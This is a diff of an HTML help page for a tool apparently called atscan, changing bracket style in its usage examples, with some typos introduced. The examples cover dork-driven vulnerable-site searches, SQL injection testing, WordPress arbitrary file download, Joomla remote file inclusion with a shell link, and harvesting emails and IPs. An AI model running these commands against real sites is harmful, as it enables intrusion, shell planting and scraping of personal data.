@@ -435,7 +435,7 @@
       <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
        <b>SET HEADERS:</b> <br>
        atscan --dork [dork / dorks.txt] --level [level] --header "Authorization:Basic YWRtaW46YWRtaW4 [OTHER]keep_alive:1" <br/>
-       atscan -t <target> --data "name:userfile[DATAFILE]value:file.txt --post --header "Authorization:Basic YWRtaW46YWRtaW4 [OTHER]keep_alive:1"
+       atscan -t target --data "name:userfile[DATAFILE]value:file.txt --post --header "Authorization:Basic YWRtaW46YWRtaW4 [OTHER]keep_alive:1"
       </td></tr></table>
       
       <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
@@ -446,20 +446,20 @@
        Set selective engines: atscan -d [dork> -l [level] -m 1,2,3.. <br/>
        Search with many dorks: atscan --dork [dork1 [OTHER]dork2 [OTHER]dork3> --level [level]    <br/>
        Search and rand: atscan -d [dork] -l [level] --exp "/index.php?id=rang(1-9)" --sql   <br/>
-       Get Server sites: atscan -t [ip] --level <value> --sites <br/>
-       Get Server sites: atscan -t "[ip from]-[ip to]" --level <value> --sites <br/>
-       Get Server sites: atscan -t "ip1 [OTHER]ip2" --level <value> --sites <br/>
+       Get Server sites: atscan -t [ip] --level [value] --sites <br/>
+       Get Server sites: atscan -t "[ip from]-[ip to]" --level [value] --sites <br/>
+       Get Server sites: atscan -t "ip1 [OTHER]ip2" --level [value] --sites <br/>
        
-       Get Server wordpress sites: atscan -t [ip] --level <value> --wp  <br/>
-       Get Server joomla sites: atscan -t [ip] --level <value> --joom  <br/>
-       Get Server upload sites: atscan -t [ip] --level <value> --upload  <br/>
-       Get Server zip sites files: atscan -t [ip] --level <value> --zip  <br/>
-       WP Arbitry File Download: atscan -t [ip] --level <value> --wpafd  <br/>
-       Joomla RFI: atscan -t [ip] --level [10] --joomfri --shell <shell link> <br/>
+       Get Server wordpress sites: atscan -t [ip] --level [value] --wp  <br/>
+       Get Server joomla sites: atscan -t [ip] --level value] --joom  <br/>
+       Get Server upload sites: atscan -t [ip] --level [value] --upload  <br/>
+       Get Server zip sites files: atscan -t [ip] --level value] --zip  <br/>
+       WP Arbitry File Download: atscan -t [ip] --level [[[value] --wpafd  <br/>
+       Joomla RFI: atscan -t [ip] --level [10] --joomfri --shell [shell link] <br/>
        Search + output: atscan --dork [dorks.txt] --level [level] --save <br/>
        Search + get emails: atscan -d [dorks.txt] -l [level] --email  <br/>
-       Search + get site emails: atscan --dork <site:site.com> --level [level] --email  <br/>
-       Search + get ips: atscan --dork [dork> --level [level] --ip 
+       Search + get site emails: atscan --dork site:site.com --level [level] --email  <br/>
+       Search + get ips: atscan --dork [dork] --level [level] --ip 
       </td></tr></table>
       
       <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
